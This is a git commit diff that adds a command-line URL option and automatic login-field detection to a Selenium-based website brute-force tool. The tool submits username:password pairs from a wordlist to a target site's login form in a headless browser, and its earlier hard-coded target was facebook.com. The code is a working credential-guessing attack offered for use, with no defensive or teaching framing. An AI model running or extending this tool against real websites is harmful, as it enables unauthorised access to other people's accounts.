e61c1789bfc7e22909b5bd0967f04221b66225bd
Pawee Tantivasdakarn <paweemew@pop-os.localdomain>
2021-04-10 14:29:19 +0700

    uncleaned version

--- tools/hydra/selenium/README.md
+++ tools/hydra/selenium/README.md
@@ -2,3 +2,8 @@
 Inspired from Hatch project: https://github.com/FlorianBord2/Hatch-python3-optimised
 
 a brute force website tool
+
+## Usage
+```
+    python3 main.py -u $URL
+```
--- tools/hydra/selenium/main.py
+++ tools/hydra/selenium/main.py
@@ -1,16 +1,26 @@
 import selenium
 import requests
 import time
+from optparse import OptionParser
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.common.keys import Keys
 
-URL = "https://www.facebook.com"
+#URL = "https://www.facebook.com"
 CHROME_DVR_DIR = './engine/chromedriver'
 WORDLIST_DIR = 'wordlist.txt'
 
-def check_url(url):
+parser = OptionParser()
+parser.add_option("-u","--url", dest="URL")
+(options, args) = parser.parse_args()
+
+if(options.URL == None):
+    print('No valid URL')
+    exit()
+URL=options.URL
+
+def validate_url(url):
     try:
         request = requests.get(url)
         if request.status_code == 200:
@@ -22,41 +32,61 @@ def check_url(url):
 
 name = URL.split('.')[1]
 f = open(WORDLIST_DIR, 'r')
+sel_field = open('field.txt','r')
 chrome_options = webdriver.ChromeOptions()
 # chrome_options.add_argument("--window-size=1024x768")
 chrome_options.add_argument("--disable-popup-blocking")
 chrome_options.add_argument("--disable-extensions")
 chrome_options.add_argument("--headless")
-check_url(URL)
+if(validate_url(URL)):
+    pass
+else:
+    print("URL was wrong or didn't include http or https")
+    exit()
 with webdriver.Chrome(executable_path=CHROME_DVR_DIR,options=chrome_options) as driver:
     driver.get(URL)
-    driver.save_screenshot(f"./images/{name}.png")
+    driver.save_screenshot(f"./images/pre-{name}.png")
+    username_field = None
+    password_field = None
+    for line in sel_field:
+        line_strip = line.rstrip()
+        line_split = line_strip.split(':')
+        username = line_split[0]
+        password = line_split[1]
+        try:
+            if(driver.find_element_by_name(username) and driver.find_element_by_name(password)):
+                username_field,password_field = username,password
+                print(f'found fields key - {line_strip}')
+                break
+        except:
+            continue
+    if(username_field is None and password_field is None):
+        print('No fields key found')
+        exit()
     temp= ""
     while True:
         try:
             for line in f:
-                splited_line = line.split(':')
-                username=splited_line[0]
-                password=splited_line[1]
-                print(username,password)
+                line_strip = line.rstrip()
+                line_split = line_strip.split(':')
+                username=line_split[0]
+                password=line_split[1]
                 #driver.maximize_window()  # For maximizing window
                 driver.get(URL)
-                time.sleep(2)
-                sel_username = driver.find_element_by_name("email")
-                sel_password = driver.find_element_by_name("pass")
+                time.sleep(1)
+                sel_username = driver.find_element_by_name(username_field)
+                sel_password = driver.find_element_by_name(password_field)
                 sel_username.send_keys(username)
-                sel_password.send_keys(password)
-                #sel_password.submit()
-                #sel_password.send_keys(Keys.ENTER)
-                sel_button = driver.find_element_by_name("login")
-                print('------------')
-                print(f'Tried username: {username}')
-                print(f'Tried password: {password}')
-                print('------------')
-                #sel_password.submit()
-                sel_button.click()
-                time.sleep(3)
-                temp= line
+                sel_password.send_keys(password,Keys.ENTER)
+                print(f'tried combination - {line_strip}')
+                time.sleep(1)
+                driver.save_screenshot(f"./images/result-{name}.png")
+                temp= line_strip
+                driver.find_element_by_name(username_field)
+            print(f'no combination found')
+            exit()
         except KeyboardInterrupt:
             exit()
-
+        except selenium.common.exceptions.NoSuchElementException:
+            print(f'founded combination - {temp}')
+            exit()
